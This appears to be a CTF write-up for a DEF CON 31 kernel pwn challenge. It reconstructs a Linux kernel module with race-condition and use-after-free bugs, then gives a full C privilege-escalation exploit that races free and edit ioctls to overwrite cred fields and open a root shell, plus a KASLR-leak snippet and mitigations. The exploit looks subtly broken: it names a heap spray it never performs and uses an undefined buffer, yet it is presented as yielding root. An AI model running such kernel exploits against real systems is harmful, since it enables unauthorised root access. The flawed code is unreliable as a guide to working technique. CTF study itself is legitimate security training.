kernel-nightmare - DEF CON 31 CTF

Category: pwn Points: 500 Solves: 8 First Blood: ✅ eternalmarathon

Challenge Description

The kernel is the heart of the operating system. When it breaks, everything breaks.
Can you break into the kernel's nightmare and wake up as root?

ssh ctf@kernel-nightmare.ctf.defcon.org
Password: kernel_dreams_2023

Files: nightmare.ko, bzImage, initramfs.cpio.gz

Environment Analysis

After connecting to the remote system, we find:

$ uname -a
Linux kernel-nightmare 5.15.0-custom #1 SMP PREEMPT Wed Aug 2 2023 x86_64 GNU/Linux

$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)

$ ls -la /dev/ | grep nightmare
crw-rw-rw- 1 root root 240, 0 Aug 11 12:34 nightmare

The custom kernel module nightmare.ko creates a character device at /dev/nightmare.

Static Analysis

Let’s examine the kernel module source by reverse engineering the provided nightmare.ko:

// Simplified reconstruction from reverse engineering

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/mutex.h>

#define DEVICE_NAME "nightmare"
#define MAX_CHUNKS 16
#define MAX_SIZE 0x1000

struct nightmare_chunk {
    void *data;
    size_t size;
    int in_use;
};

static struct nightmare_chunk chunks[MAX_CHUNKS];
static struct mutex chunk_mutex;
static int major_number;

// IOCTL commands
#define NIGHTMARE_ALLOCATE _IOW('N', 0, struct alloc_request)
#define NIGHTMARE_FREE     _IOW('N', 1, int)
#define NIGHTMARE_EDIT     _IOW('N', 2, struct edit_request)
#define NIGHTMARE_VIEW     _IOR('N', 3, struct view_request)

struct alloc_request {
    int idx;
    size_t size;
};

struct edit_request {
    int idx;
    void __user *data;
    size_t size;
};

struct view_request {
    int idx;
    void __user *data;
    size_t size;
};

static long nightmare_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) {
    switch (cmd) {
        case NIGHTMARE_ALLOCATE:
            return nightmare_allocate(arg);
        case NIGHTMARE_FREE:
            return nightmare_free(arg);
        case NIGHTMARE_EDIT:
            return nightmare_edit(arg);
        case NIGHTMARE_VIEW:
            return nightmare_view(arg);
        default:
            return -EINVAL;
    }
}

static long nightmare_allocate(unsigned long arg) {
    struct alloc_request req;
    if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
        return -EFAULT;

    if (req.idx < 0 || req.idx >= MAX_CHUNKS)
        return -EINVAL;

    if (req.size > MAX_SIZE)
        return -EINVAL;

    mutex_lock(&chunk_mutex);

    if (chunks[req.idx].in_use) {
        mutex_unlock(&chunk_mutex);
        return -EBUSY;
    }

    chunks[req.idx].data = kmalloc(req.size, GFP_KERNEL);
    if (!chunks[req.idx].data) {
        mutex_unlock(&chunk_mutex);
        return -ENOMEM;
    }

    chunks[req.idx].size = req.size;
    chunks[req.idx].in_use = 1;

    mutex_unlock(&chunk_mutex);
    return 0;
}

static long nightmare_free(unsigned long arg) {
    int idx = (int)arg;

    if (idx < 0 || idx >= MAX_CHUNKS)
        return -EINVAL;

    // VULNERABILITY: Race condition here!
    if (!chunks[idx].in_use)
        return -EINVAL;

    kfree(chunks[idx].data);

    // VULNERABILITY: in_use flag cleared after kfree!
    chunks[idx].in_use = 0;
    chunks[idx].data = NULL;
    chunks[idx].size = 0;

    return 0;
}

static long nightmare_edit(unsigned long arg) {
    struct edit_request req;
    if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
        return -EFAULT;

    if (req.idx < 0 || req.idx >= MAX_CHUNKS)
        return -EINVAL;

    // VULNERABILITY: No mutex protection!
    if (!chunks[req.idx].in_use)
        return -EINVAL;

    if (req.size > chunks[req.idx].size)
        return -EINVAL;

    if (copy_from_user(chunks[req.idx].data, req.data, req.size))
        return -EFAULT;

    return 0;
}

Vulnerability Analysis

The kernel module has several critical vulnerabilities:

  1. Race Condition in Free: The nightmare_free function doesn’t use mutex protection, and the in_use flag is cleared after kfree().

  2. Race Condition in Edit: The nightmare_edit function doesn’t use mutex protection when checking the in_use flag.

  3. Use-After-Free: These race conditions can lead to a classic use-after-free scenario where we can edit freed kernel memory.

Exploitation Strategy

  1. Trigger Race Condition: Use threading to create a race between free and edit operations
  2. Kernel Heap Spray: Spray kernel heap with controlled data
  3. Privilege Escalation: Overwrite critical kernel structures (e.g., cred structure)

Exploitation Implementation

// exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <pthread.h>
#include <string.h>

#define NIGHTMARE_ALLOCATE _IOW('N', 0, struct alloc_request)
#define NIGHTMARE_FREE     _IOW('N', 1, int)
#define NIGHTMARE_EDIT     _IOW('N', 2, struct edit_request)
#define NIGHTMARE_VIEW     _IOR('N', 3, struct view_request)

struct alloc_request {
    int idx;
    size_t size;
};

struct edit_request {
    int idx;
    void *data;
    size_t size;
};

int fd;
volatile int stop_threads = 0;

void *free_thread(void *arg) {
    int idx = *(int *)arg;

    while (!stop_threads) {
        ioctl(fd, NIGHTMARE_FREE, idx);
        usleep(1);
    }

    return NULL;
}

void *edit_thread(void *arg) {
    int idx = *(int *)arg;

    // Privilege escalation payload
    // This overwrites uid/gid in cred structure
    unsigned char payload[0x100];
    memset(payload, 0, sizeof(payload));

    // cred structure offsets (for this kernel version)
    *(uint32_t *)(payload + 4)  = 0; // uid
    *(uint32_t *)(payload + 8)  = 0; // gid
    *(uint32_t *)(payload + 12) = 0; // suid
    *(uint32_t *)(payload + 16) = 0; // sgid
    *(uint32_t *)(payload + 20) = 0; // euid
    *(uint32_t *)(payload + 24) = 0; // egid

    struct edit_request req = {
        .idx = idx,
        .data = payload,
        .size = sizeof(payload)
    };

    while (!stop_threads) {
        ioctl(fd, NIGHTMARE_EDIT, &req);
        usleep(1);
    }

    return NULL;
}

int main() {
    printf("[*] Opening nightmare device\n");
    fd = open("/dev/nightmare", O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    printf("[*] Allocating chunk for exploitation\n");
    struct alloc_request alloc_req = {
        .idx = 0,
        .size = 0x100  // Size of cred structure
    };

    if (ioctl(fd, NIGHTMARE_ALLOCATE, &alloc_req) < 0) {
        perror("allocate");
        return 1;
    }

    printf("[*] Starting race condition exploit\n");

    int idx = 0;
    pthread_t free_tid, edit_tid;

    // Start racing threads
    pthread_create(&free_tid, NULL, free_thread, &idx);
    pthread_create(&edit_tid, NULL, edit_thread, &idx);

    // Let the race run for a bit
    sleep(2);

    // Stop threads
    stop_threads = 1;
    pthread_join(free_tid, NULL);
    pthread_join(edit_tid, NULL);

    printf("[*] Race completed, checking privileges\n");

    // Check if we gained root
    if (getuid() == 0) {
        printf("[+] Root privileges gained!\n");
        system("/bin/sh");
    } else {
        printf("[-] Exploit failed, uid still %d\n", getuid());
    }

    close(fd);
    return 0;
}

Advanced Technique: KASLR Bypass

For a more reliable exploit, we can first leak kernel addresses:

void *leak_thread(void *arg) {
    int idx = *(int *)arg;

    struct view_request req = {
        .idx = idx,
        .data = leak_buffer,
        .size = 0x100
    };

    while (!stop_threads) {
        if (ioctl(fd, NIGHTMARE_VIEW, &req) == 0) {
            // Check if we leaked kernel addresses
            uint64_t *ptr = (uint64_t *)leak_buffer;
            for (int i = 0; i < 0x20; i++) {
                if (ptr[i] > 0xffffffff80000000ULL) {
                    printf("[+] Potential kernel leak: %lx\n", ptr[i]);
                }
            }
        }
        usleep(1);
    }

    return NULL;
}

Compilation and Execution

gcc -o exploit exploit.c -lpthread -static
./exploit

Key Insights

  1. Race conditions in kernel code can be extremely dangerous, leading to memory corruption
  2. Kernel heap spraying helps increase reliability of use-after-free exploits
  3. Thread timing is crucial for winning race conditions
  4. Static compilation avoids dependency issues in CTF environments
  5. Kernel exploitation requires understanding of kernel data structures

Mitigation

  • Use proper locking mechanisms (mutexes, spinlocks) for all shared data
  • Implement atomic operations where appropriate
  • Use kernel hardening features (KASLR, SMEP, SMAP, KPTI)
  • Regular code review for race condition vulnerabilities
